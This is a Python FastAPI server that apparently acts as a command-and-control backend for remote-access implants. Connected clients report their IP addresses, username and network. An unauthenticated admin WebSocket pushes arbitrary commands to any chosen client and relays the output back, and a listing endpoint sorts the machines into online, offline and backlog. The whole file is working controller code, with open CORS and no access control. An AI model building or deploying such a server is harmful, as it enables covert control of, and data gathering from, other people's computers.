from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import time
import json
import os

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}          # client_id → WebSocket
last_seen = {}        # client_id → timestamp
client_infos = {}     # client_id → info dict
admin_ws = None

# Thresholds in Sekunden
OFFLINE_THRESHOLD = 60    # ab hier als "Offline" gelistet
BACKLOG_THRESHOLD = 120   # ab hier ins Backlog verschieben

@app.get("/clients")
async def list_clients():
    now = time.time()
    online = []
    offline = []
    backlog = []
    for cid, ws in clients.items():
        delta = now - last_seen.get(cid, 0)
        info = client_infos.get(cid, {})
        entry = {
            "id": cid,
            "public_ip": info.get("public_ip", ""),
            "private_ip": info.get("private_ip", ""),
            "username": info.get("username", ""),
            "network": info.get("network", ""),
            "last_seen": last_seen.get(cid, 0),
        }
        if delta >= BACKLOG_THRESHOLD:
            entry["status"] = "Backlog"
            backlog.append(entry)
        elif delta >= OFFLINE_THRESHOLD:
            entry["status"] = "Offline"
            offline.append(entry)
        else:
            entry["status"] = "Online"
            online.append(entry)
    return {"online": online, "offline": offline, "backlog": backlog}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    last_seen[client_id] = time.time()

    try:
        while True:
            data = await websocket.receive()
            last_seen[client_id] = time.time()

            # Client-Info
            if "text" in data:
                try:
                    msg = json.loads(data["text"])
                    if msg.get("type") == "client_info":
                        # speichere alle Infos inkl. private_ip & network
                        client_infos[client_id] = msg.get("data", {})
                        continue
                except json.JSONDecodeError:
                    pass

                # Weiterleitung von Ausgaben/Bytes an Admin-WS
                if admin_ws:
                    if "text" in data:
                        await admin_ws.send_text(f"[{client_id}] {data['text']}")
                    else:
                        await admin_ws.send_bytes(data["bytes"])

    except WebSocketDisconnect:
        clients.pop(client_id, None)
        last_seen.pop(client_id, None)
        client_infos.pop(client_id, None)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    global admin_ws
    await websocket.accept()
    admin_ws = websocket
    try:
        while True:
            msg = await websocket.receive_json()
            target = msg.get("target")
            cmd = msg.get("cmd")
            if target in clients:
                await clients[target].send_text(cmd)
    except WebSocketDisconnect:
        admin_ws = None

@app.get("/")
async def serve_index():
    with open("static/index.html") as f:
        return HTMLResponse(content=f.read(), status_code=200)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
